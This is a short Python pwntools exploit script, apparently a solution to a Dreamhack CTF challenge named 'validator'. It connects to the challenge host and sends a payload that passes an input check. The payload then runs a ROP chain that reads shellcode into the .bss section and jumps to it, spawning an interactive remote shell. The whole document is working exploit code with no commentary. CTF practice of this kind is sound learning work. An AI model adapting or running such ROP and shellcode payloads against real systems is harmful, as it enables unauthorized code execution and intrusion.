#!/usr/bin/env python2

from pwn import *

context.log_level = "debug"
context.update(arch="amd64", os="linux")

HOST = "host1.dreamhack.games"
PORT = 20108

#HOST = "127.0.0.1"
#PORT = 12345

elf = ELF("./validator_dist")
conn = remote(HOST, PORT)

pop_rdi = 0x00000000004006f3
pop_rsi_pop_r15 = 0x00000000004006f1
pop_rdx = 0x000000000040057b 

sc = asm(shellcraft.sh())

payload = "DREAMHACK!"
payload += asm("nop")
for i in range(0x80-0x9, 0x01, -1):
    payload += p8(i)
payload += p8(0)*7

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_pop_r15)
payload += p64(elf.bss())
payload += p64(1)
payload += p64(pop_rdx)
payload += p64(50)
payload += p64(elf.plt["read"])

payload += p64(elf.bss()) # :D

'''
with open("./shit", "wb+") as shit:
    shit.write(payload)
    shit.close()
'''

conn.send(payload)
conn.send(sc)
conn.interactive()
